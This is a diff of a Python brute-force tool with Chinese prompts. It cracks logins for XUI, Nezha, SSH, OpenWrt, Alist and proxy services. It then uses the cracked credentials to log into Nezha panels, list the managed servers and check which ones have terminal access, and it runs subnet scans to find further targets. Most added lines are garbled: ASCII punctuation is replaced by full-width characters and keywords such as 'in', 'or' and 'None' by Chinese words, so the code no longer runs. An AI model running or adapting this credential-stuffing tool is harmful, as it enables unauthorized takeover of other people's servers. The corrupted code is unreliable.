@@ -1237,13 +1237,13 @@ if __name__ == "__main__":
 """
 
 def generate_ipcx_py():
-    with open('ipcx.py', 'w', encoding='utf-8') as f:
+    with open('ipcx.py'， 'w', encoding='utf-8') as f:
         f.write(IPCX_PY_CONTENT)
 
 # 哪吒面板分析函数
 def analyze_panel(result_line):
     parts = result_line.split()
-    if len(parts) < 3: return result_line, (0, 0, "格式错误")
+    if len(parts) < 3: return result_line, (0， 0, "格式错误")
     ip_port, username, password = parts[0], parts[1], parts[2]
     for protocol in ["http", "https"]:
         base_url = f"{protocol}://{ip_port}"
@@ -1251,7 +1251,7 @@ def analyze_panel(result_line):
         login_url = base_url + "/api/v1/login"
         payload = {"username": username, "password": password}
         try:
-            requests.packages.urllib3.disable_warnings()
+            requests.packages。urllib3.disable_warnings()
             res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
             if res.status_code == 200:
                 try:
@@ -1261,7 +1261,7 @@ def analyze_panel(result_line):
                         if "token" in j.get("data", {}):
                             session.headers.update({"Authorization": f"Bearer {j['data']['token']}"})
                         
-                        machine_count, term_count, term_servers = 0, 0, []
+                        machine_count, term_count, term_servers = 0, 0， []
                         try:
                             server_res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
                             if server_res.status_code == 200:
@@ -1269,7 +1269,7 @@ def analyze_panel(result_line):
                                 servers = server_data if isinstance(server_data, list) else server_data.get("data", [])
                                 machine_count = len(servers)
                                 # 在获取到服务器列表后，再检查终端状态
-                                for server in servers:
+                                for server 在 servers:
                                     if isinstance(server, dict) and "id" in server:
                                         if check_server_terminal_status(session, base_url, server["id"]):
                                             term_count += 1
@@ -1278,13 +1278,13 @@ def analyze_panel(result_line):
                         except Exception:
                             pass
                         
-                        servers_string = ", ".join([s.get('name', str(s.get('id', ''))) for s in term_servers]) or "无"
+                        servers_string = ", "。join([s.get('name'， str(s.get('id'， ''))) for s 在 term_servers]) 或 "无"
                         return result_line, (machine_count, term_count, servers_string)
                 except Exception:
                     return result_line, (0, 0, "分析失败")
         except requests.exceptions.RequestException:
             continue
-    return result_line, (0, 0, "登录失败")
+    return result_line, (0， 0， "登录失败")
 
 def check_server_terminal_status(session, base_url, server_id):
     try:
@@ -1541,34 +1541,34 @@ def clean_temp_files():
         'xui.go', 'subnet_scanner.go', 'ipcx.py', 'go.mod', 'go.sum', 'tcp_prescan.go',
         'xui_executable', 'xui_executable.exe',
         'subnet_scanner_executable', 'subnet_scanner_executable.exe',
-        'tcp_prescan_executable', 'tcp_prescan_executable.exe'
+        'tcp_prescan_executable'， 'tcp_prescan_executable.exe'
     ]
     for f in files_to_remove:
-        if os.path.exists(f):
+        if os.path。exists(f):
             try: os.remove(f)
             except OSError: pass
     print("✅ [清理] 清理完成。")
 
 def choose_template_mode():
     print("请选择爆破模式：\n1. XUI面板\n2. 哪吒面板\n3. SSH\n4. Sub Store\n5. OpenWrt/iStoreOS\n--- 代理模式 ---\n6. SOCKS5 代理\n7. HTTP 代理\n8. HTTPS 代理\n--- 其他面板 ---\n9. Alist 面板\n10. TCP 端口活性检测")
-    choices = {"1": 1, "2": 2, "3": 6, "4": 7, "5": 8, "6": 9, "7": 10, "8": 11, "9": 12, "10": 13}
+    choices = {"1": 1, "2": 2， "3": 6, "4": 7, "5": 8, "6": 9, "7": 10, "8": 11, "9": 12, "10": 13}
     while True:
-        choice = input("输入 1-10 之间的数字 (默认: 1)：").strip() or "1"
+        choice = input("输入 1-10 之间的数字 (默认: 1)：")。strip() 或 "1"
         if choice in choices: return choices[choice]
         print("❌ 输入无效，请重新输入。")
 
 def load_credentials(template_mode):
     if template_mode in [7, 12, 13]: return [], [], [] # No creds needed
-    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
+    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ")。strip().lower()
     if use_custom == 'y':
         if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
             print("❌ 错误: 缺少 username.txt 或 password.txt 文件。"); sys.exit(1)
-        with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
+        with open("username.txt"， 'r', encoding='utf-8-sig', errors='ignore') as f:
             usernames = [line.strip() for line in f if line.strip()]
-        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
+        with open("password.txt"， 'r', encoding='utf-8-sig', errors='ignore') as f:
             passwords = [line.strip() for line in f if line.strip()]
         if template_mode == 2:
-            passwords = [p for p in passwords if len(p) >= 8 or p == 'admin']
+            passwords = [p for p 在 passwords if len(p) >= 8 或 p == 'admin']
             if not passwords: print("❌ 错误: 过滤后，密码字典为空。"); sys.exit(1)
         if not usernames or not passwords: print("❌ 错误: 用户名或密码文件为空。"); sys.exit(1)
         return usernames, passwords, []
@@ -1585,10 +1585,10 @@ def parse_result_line(line):
         ip_port = parts[0]
         user = parts[1] if len(parts) > 1 else ''
         password = parts[2] if len(parts) > 2 else ''
-        if ':' in ip_port:
-            ip, port = ip_port.split(':', 1)
+        if ':' 在 ip_port:
+            ip, port = ip_port.split(':'， 1)
             return ip, port, user, password
-    return None, None, None, None
+    return 无， 无, 无, None
 
 def scan_single_cluster(cluster_info):
     cluster_id, subnet_prefix, port, user, password, subnet_size, subnet_scanner_executable, _ = cluster_info
@@ -1604,7 +1604,7 @@ def scan_single_cluster(cluster_info):
         if not ips_to_verify: return newly_verified
         
         verify_input = os.path.join(TEMP_EXPAND_DIR, f"verify_in_{cluster_id}.tmp")
-        verify_output = os.path.join(TEMP_EXPAND_DIR, f"verify_out_{cluster_id}.tmp")
+        verify_output = os.path。join(TEMP_EXPAND_DIR, f"verify_out_{cluster_id}.tmp")
         with open(verify_input, 'w') as f: f.write("\n".join(ips_to_verify))
 
         # Compile a temporary, specific executable for this cluster
@@ -1618,7 +1618,7 @@ def scan_single_cluster(cluster_info):
             subprocess.run(['./' + executable, verify_input, verify_output], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
             if os.path.exists(verify_output):
                 with open(verify_output, 'r') as f:
-                    newly_verified.update(line.strip() for line in f)
+                    newly_verified.update(line.strip() for line 在 f)
     except Exception:
         pass
     finally:
